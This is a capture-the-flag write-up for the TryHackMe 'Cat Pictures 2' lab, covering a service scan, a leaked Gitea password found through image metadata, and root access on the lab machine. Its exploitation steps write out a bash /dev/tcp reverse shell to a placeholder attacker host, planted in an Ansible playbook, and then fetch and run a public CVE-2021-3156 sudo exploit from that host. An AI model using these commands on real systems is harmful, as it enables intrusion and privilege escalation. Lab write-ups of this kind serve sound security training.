---
tags:
  - THM
  - Linux
  - Easy
  - CMS
  - File-Analysis
  - Leakage
  - Git
  - RCE
  - Sudo
---
https://tryhackme.com/room/catpictures2/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.75.211 cats2.thm
```
# Scanning
## Nmap
```console
$ nmap -p22,80,222,1337,3000,8080 -sV -sC cats2.thm

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:f0:03:36:26:36:8c:2f:88:95:2c:ac:c3:bc:64:65 (RSA)
|   256 4f:f3:b3:f2:6e:03:91:b2:7c:c0:53:d5:d4:03:88:46 (ECDSA)
|_  256 13:7c:47:8b:6f:f8:f4:6b:42:9a:f2:d5:3d:34:13:52 (ED25519)
80/tcp   open  http    nginx 1.4.6 (Ubuntu)
|_http-server-header: nginx/1.4.6 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
|_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/
|_http-title: Lychee
| http-git: 
|   10.10.75.211:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|       https://github.com/electerious/Lychee.git
|_    Project type: PHP application (guessed from .gitignore)
222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
| ssh-hostkey: 
|   256 be:cb:06:1f:33:0f:60:06:a0:5a:06:bf:06:53:33:c0 (ECDSA)
|_  256 9f:07:98:92:6e:fd:2c:2d:b0:93:fa:fe:e8:95:0c:37 (ED25519)
1337/tcp open  http    Golang net/http server
|_http-title: OliveTin
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Content-Length: 3858
|     Content-Type: text/html; charset=utf-8
|     Date: Wed, 21 May 2025 00:28:07 GMT
|     Last-Modified: Wed, 19 Oct 2022 15:30:49 GMT
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>OliveTin</title>
|     <link rel = "stylesheet" type = "text/css" href = "style.css" />
|     <link rel = "shortcut icon" type = "image/png" href = "OliveTinLogo.png" />
|     <link rel = "apple-touch-icon" sizes="57x57" href="OliveTinLogo-57px.png" />
|     <link rel = "apple-touch-icon" sizes="120x120" href="OliveTinLogo-120px.png" />
|     <link rel = "apple-touch-icon" sizes="180x180" href="OliveTinLogo-180px.png" />
|     </head>
|     <body>
|     <main title = "main content">
|     <fieldset id = "section-switcher" title = "Sections">
|     <button id = "showActions">Actions</button>
|_    <button id = "showLogs">Logs</but
3000/tcp open  http    Golang net/http server
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: no-store, no-transform
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=da52ced32cc30fb5; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=aY4aKDOH4x7puMH-HdkDTGG3LFw6MTc0Nzc4NzI4NzA3NDg5OTMyNA; Path=/; Expires=Thu, 22 May 2025 00:28:07 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 21 May 2025 00:28:07 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title> Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Cache-Control: no-store, no-transform
|     Set-Cookie: i_like_gitea=c5bb328d1795375a; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=RwXG7izfprIkdZUpfBLNRlWj9u06MTc0Nzc4NzI4Nzk1MTg5OTI4Mw; Path=/; Expires=Thu, 22 May 2025 00:28:07 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 21 May 2025 00:28:07 GMT
|_    Content-Length: 0
|_http-title:  Gitea: Git with a cup of tea
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
|_http-title: Welcome to nginx!
|_http-server-header: SimpleHTTP/0.6 Python/3.6.9
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1337-TCP:V=7.95%I=7%D=5/20%Time=682D1E17%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,FCC,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
SF:x20bytes\r\nContent-Length:\x203858\r\nContent-Type:\x20text/html;\x20c
SF:harset=utf-8\r\nDate:\x20Wed,\x2021\x20May\x202025\x2000:28:07\x20GMT\r
SF:\nLast-Modified:\x20Wed,\x2019\x20Oct\x202022\x2015:30:49\x20GMT\r\n\r\
SF:n<!DOCTYPE\x20html>\n\n<html>\n\t<head>\n\n\t\t<meta\x20name=\"viewport
SF:\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\n\t\t<ti
SF:tle>OliveTin</title>\n\t\t<link\x20rel\x20=\x20\"stylesheet\"\x20type\x
SF:20=\x20\"text/css\"\x20href\x20=\x20\"style\.css\"\x20/>\n\t\t<link\x20
SF:rel\x20=\x20\"shortcut\x20icon\"\x20type\x20=\x20\"image/png\"\x20href\
SF:x20=\x20\"OliveTinLogo\.png\"\x20/>\n\n\t\t<link\x20rel\x20=\x20\"apple
SF:-touch-icon\"\x20sizes=\"57x57\"\x20href=\"OliveTinLogo-57px\.png\"\x20
SF:/>\n\t\t<link\x20rel\x20=\x20\"apple-touch-icon\"\x20sizes=\"120x120\"\
SF:x20href=\"OliveTinLogo-120px\.png\"\x20/>\n\t\t<link\x20rel\x20=\x20\"a
SF:pple-touch-icon\"\x20sizes=\"180x180\"\x20href=\"OliveTinLogo-180px\.pn
SF:g\"\x20/>\n\t</head>\n\n\t<body>\n\t\t<main\x20title\x20=\x20\"main\x20
SF:content\">\n\t\t\t<fieldset\x20id\x20=\x20\"section-switcher\"\x20title
SF:\x20=\x20\"Sections\">\n\t\t\t\t<button\x20id\x20=\x20\"showActions\">A
SF:ctions</button>\n\t\t\t\t<button\x20id\x20=\x20\"showLogs\">Logs</but")
SF:%r(HTTPOptions,FCC,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r
SF:\nContent-Length:\x203858\r\nContent-Type:\x20text/html;\x20charset=utf
SF:-8\r\nDate:\x20Wed,\x2021\x20May\x202025\x2000:28:07\x20GMT\r\nLast-Mod
SF:ified:\x20Wed,\x2019\x20Oct\x202022\x2015:30:49\x20GMT\r\n\r\n<!DOCTYPE
SF:\x20html>\n\n<html>\n\t<head>\n\n\t\t<meta\x20name=\"viewport\"\x20cont
SF:ent=\"width=device-width,\x20initial-scale=1\.0\">\n\n\t\t<title>OliveT
SF:in</title>\n\t\t<link\x20rel\x20=\x20\"stylesheet\"\x20type\x20=\x20\"t
SF:ext/css\"\x20href\x20=\x20\"style\.css\"\x20/>\n\t\t<link\x20rel\x20=\x
SF:20\"shortcut\x20icon\"\x20type\x20=\x20\"image/png\"\x20href\x20=\x20\"
SF:OliveTinLogo\.png\"\x20/>\n\n\t\t<link\x20rel\x20=\x20\"apple-touch-ico
SF:n\"\x20sizes=\"57x57\"\x20href=\"OliveTinLogo-57px\.png\"\x20/>\n\t\t<l
SF:ink\x20rel\x20=\x20\"apple-touch-icon\"\x20sizes=\"120x120\"\x20href=\"
SF:OliveTinLogo-120px\.png\"\x20/>\n\t\t<link\x20rel\x20=\x20\"apple-touch
SF:-icon\"\x20sizes=\"180x180\"\x20href=\"OliveTinLogo-180px\.png\"\x20/>\
SF:n\t</head>\n\n\t<body>\n\t\t<main\x20title\x20=\x20\"main\x20content\">
SF:\n\t\t\t<fieldset\x20id\x20=\x20\"section-switcher\"\x20title\x20=\x20\
SF:"Sections\">\n\t\t\t\t<button\x20id\x20=\x20\"showActions\">Actions</bu
SF:tton>\n\t\t\t\t<button\x20id\x20=\x20\"showLogs\">Logs</but");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.95%I=7%D=5/20%Time=682D1E17%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2DEE,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
SF:\x20no-store,\x20no-transform\r\nContent-Type:\x20text/html;\x20charset
SF:=UTF-8\r\nSet-Cookie:\x20i_like_gitea=da52ced32cc30fb5;\x20Path=/;\x20H
SF:ttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=aY4aKDOH4x7puMH-HdkDTG
SF:G3LFw6MTc0Nzc4NzI4NzA3NDg5OTMyNA;\x20Path=/;\x20Expires=Thu,\x2022\x20M
SF:ay\x202025\x2000:28:07\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cook
SF:ie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly;\x20SameSit
SF:e=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Wed,\x2021\x20May\x
SF:202025\x2000:28:07\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en
SF:-US\"\x20class=\"theme-\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1\">\n\t<title>\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea</
SF:title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:application/json;bas
SF:e64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWU
SF:iOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2
SF:xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi")%r(Help,67,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charse
SF:t=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOp
SF:tions,1C2,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nCache-Contro
SF:l:\x20no-store,\x20no-transform\r\nSet-Cookie:\x20i_like_gitea=c5bb328d
SF:1795375a;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_cs
SF:rf=RwXG7izfprIkdZUpfBLNRlWj9u06MTc0Nzc4NzI4Nzk1MTg5OTI4Mw;\x20Path=/;\x
SF:20Expires=Thu,\x2022\x20May\x202025\x2000:28:07\x20GMT;\x20HttpOnly;\x2
SF:0SameSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0
SF:;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDat
SF:e:\x20Wed,\x2021\x20May\x202025\x2000:28:07\x20GMT\r\nContent-Length:\x
SF:200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Summary
- 22: SSH
- [80](http://cats2.thm:80/): photo management website using [Lychee](https://github.com/LycheeOrg/Lychee).
- 222: SSH
- [1337](http://cats2.thm:1337/): website to run predefined commands using [OliveTin](https://www.olivetin.app/).
- [3000](http://cats2.thm:3000/): self-hosted git repository using [Gitea](https://about.gitea.com/).
- [8080](http://cats2.thm:8080/): [nginx](https://nginx.org/) default website.
# Enumeration
## OliveTin
The available commands to run are:
- Run backup script
- Ping host
- **Run ansible playbook**
- Slow script
- Broken script (timeout)
## Lychee
The first image's (**timo-volz**) description after clicking the **about** button is:
```text
note to self: strip metadata
```
Download the **image** as `cat.jpg`:
```bash
curl -s -o cat.jpg http://cats2.thm/uploads/big/f5054e97620f168c7b5088c85ab1d6e4.jpg
```
Extract the **image's metadata**. The `Title` tag seems interesting:
```
$ exiftool cat.jpg

ExifTool Version Number         : 13.30
File Name                       : image.jpg
Directory                       : .
File Size                       : 7.4 MB
File Modification Date/Time     : 2025:05:31 16:50:39-06:00
File Access Date/Time           : 2025:05:31 16:50:23-06:00
File Inode Change Date/Time     : 2025:05:31 16:50:39-06:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
XMP Toolkit                     : Image::ExifTool 12.49
Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt
Profile CMM Type                : Little CMS
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2012:01:25 03:41:57
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : c2
Profile Copyright               : IX
Media White Point               : 0.9642 1 0.82491
Media Black Point               : 0.01205 0.0125 0.01031
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
Image Width                     : 5189
Image Height                    : 7779
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 5189x7779
Megapixels                      : 40.4
```
Found **Gitea's password** in a note file:
```console
$ curl -s http://cats2.thm:8080/764efa883dda1e11db47671c4a3bbd9e.txt

note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337
```
# Exploitation
Sign in with **Gitea's leaked credentials**. The repository is called **ansible**, referencing one of the OliveTin's commands.

Read the **first flag** from `flag1.txt` file.

Modify the `command` parameter in the `playbook.yaml` file to get a reverse shell:
```yaml
---
- name: Test 
  hosts: all                                  # Define all the hosts
  remote_user: bismuth                                  
  # Defining the Ansible task
  tasks:             
    - name: get the username running the deploy
      become: false
      #command: whoami
      command: bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: Test
      shell: echo hi
```
Wait for connections:
```bash
nc -lvnp <PORT>
```
In the OliveTin's website (port 1337), click on **run ansible playbook** command.
# Post-Exploitation
Read the **second flag**:
```bash
cat /home/bismuth/flag2.txt
```
The `sudo` version is between 1.8.2 and 1.8.31p2, so it is vulnerable to [CVE-2021-3156](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit):
```console
$ sudo -V

Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```
Clone and share an **exploit** from the attacker's machine:
```console
$ git clone https://github.com/blasty/CVE-2021-3156

$ cd CVE-2021-3156/

$ python3 -m http.server 8000
```
From the victim's machine, download the **exploit**:
```console
$ mkdir /tmp/PrivEsc

$ cd /tmp/PrivEsc/

$ curl -s -O http://<ATTACKER-IP>:8000/hax.c

$ curl -s -O http://<ATTACKER-IP>:8000/lib.c

$ curl -s -O http://<ATTACKER-IP>:8000/Makefile
```
Compile the **exploit** and run it:
```console
$ make

$ ./sudo-hax-me-a-sandwich
** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

$ lsb_release -d
Description:	Ubuntu 18.04.6 LTS

$ ./sudo-hax-me-a-sandwich 0
```

Get the **third flag**:
```bash
cat /root/flag3.txt
```